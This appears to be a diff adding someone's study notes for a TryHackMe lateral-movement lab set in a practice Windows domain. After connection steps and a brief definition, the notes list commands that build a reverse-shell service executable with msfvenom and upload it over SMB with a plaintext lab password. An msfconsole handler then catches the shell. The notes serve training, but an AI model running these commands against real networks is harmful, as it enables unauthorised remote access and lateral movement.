@@ -1,0 +1,27 @@
+Connecting to the network
+-AttackBOx
+-test
+systemd-resolve --interface lateralmovement --set-dns [IP] --set-domain za.tryhackme.com
+nslookup thmdc.za.tryhackme.com
+-http://distributor.za.tryhackme.com/creds
+-get credentials
+ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
+-get ip
+ip add show lateralmovement
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Lateral Movement
+-group of techniques used by attackers to move around a network
+-useful for bypassing network restrictions, establish additional points of entry, create confusion and avoid detection
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Spawning Processes Remotely
+-leverage windows services to run arbitrary commands
+
+Steps: 
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=IP LPORT=PORT -o myservice.exe
+smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//IP/admin$/' EZpass4ever
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT PORT;exploit"
+
